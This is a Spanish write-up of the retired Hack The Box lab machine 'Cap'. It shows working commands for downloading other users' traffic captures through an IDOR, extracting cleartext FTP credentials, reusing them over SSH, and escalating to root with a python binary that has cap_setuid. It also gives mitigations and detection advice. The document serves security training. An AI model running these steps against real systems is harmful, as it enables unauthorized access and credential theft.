---
machine: Cap
os: Linux
difficulty: Easy
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/351
category: Machines
state: Retired
pwned: 2026-11-03
tags: [linux, web, idor, pcap, capabilities]
---

# Cap — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> Máquina **Retired**. Sin flags ni credenciales en este documento.

## TL;DR

Panel que genera capturas de tráfico en formato pcap y las sirve por un identificador incremental. Cambiando ese identificador se descarga la captura de otro usuario, y dentro viaja una sesión **FTP en claro**. Con esas credenciales se entra por SSH, y `getcap` muestra que `python3.15` tiene `cap_setuid` → root directo.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 21,22,80 <TARGET_IP>
```

| Puerto | Servicio | Versión |
|---|---|---|
| 21/tcp | FTP | vsftpd |
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Gunicorn / aplicación Python |

```bash
echo "<TARGET_IP> cap.htb" | sudo tee -a /etc/hosts
```

## Enumeración

La aplicación es un dashboard ("Security Dashboard") con estas vistas: *Dashboard*, *Security Snapshot*, *IP Config*, *Network Status*.

- `Security Snapshot` lanza una captura de 5 segundos y redirige a una descarga: `/data/<id>`.
- Al descargar, el identificador de la URL es el único control de acceso.

```bash
ffuf -u http://cap.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
     -mc 200,201,302,401,403 -t 60
```

## Foothold

### 1. IDOR sobre las capturas

```bash
curl -s -o cap0.pcap http://cap.htb/data/0
curl -s -o cap1.pcap http://cap.htb/data/1
```

Enumerando identificadores se obtienen capturas de otras sesiones. La útil es una que contiene un login FTP sin cifrar:

```bash
tcpdump -r cap0.pcap -nn -A | grep -iE 'USER|PASS'
# USER nathan
# PASS <PASS>
```

También sirve abrirlo en Wireshark: *Follow TCP Stream* sobre el puerto 21.

### 2. SSH con las credenciales del pcap

```bash
ssh nathan@cap.htb
cat user.txt      # <USER_FLAG>
```

## Escalada de privilegios

```bash
id
sudo -l            # sin sudo
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.15 cap_setuid=ep
```

Ese binario puede cambiar su propio UID a 0, así que una línea basta:

```bash
/usr/bin/python3.15 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id                 # uid=0(root)
cat /root/root.txt # <ROOT_FLAG>
```

## Evidencia

- `nmap` con 21/22/80 y la versión de Gunicorn.
- Descarga de `/data/0` frente a `/data/1` (dos capturas distintas, mismo usuario sin privilegios).
- `Follow TCP Stream` mostrando `USER`/`PASS` en claro.
- `getcap` con `cap_setuid=ep` y `id` como root.

## Lecciones aprendidas

- Un identificador incremental en una URL es un IDOR en potencia: si el servidor no comprueba la propiedad, el dato es de todos.
- FTP transmite credenciales en claro; basta una captura para reutilizarlas en SSH.
- Las *capabilities* son un SUID moderno: `cap_setuid` en un intérprete es root inmediato y no aparece en `find -perm -4000`.
- `getcap -r /` debería ser tan obligatorio como buscar SUIDs en cualquier Linux.

## Mitigaciones y detección

- Autorización por objeto: cada descarga debe validar que el recurso pertenece al usuario autenticado, no sólo que exista.
- Identificadores no adivinables (UUID) y caducidad de las capturas.
- Sustituir FTP por SFTP/FTPS; nunca reutilizar contraseñas de servicio en SSH.
- Eliminar `cap_setuid` de intérpretes y binarios que no lo necesiten (`setcap -r`), y auditar `getcap` de forma periódica.
- Detección: descargas secuenciales de `/data/<n>` desde una misma sesión y accesos SSH desde IPs nuevas con cuentas de servicio.

## Referencias

- <https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control>
- <https://man7.org/linux/man-pages/man7/capabilities.7.html>
- <https://man7.org/linux/man-pages/man8/getcap.8.html>
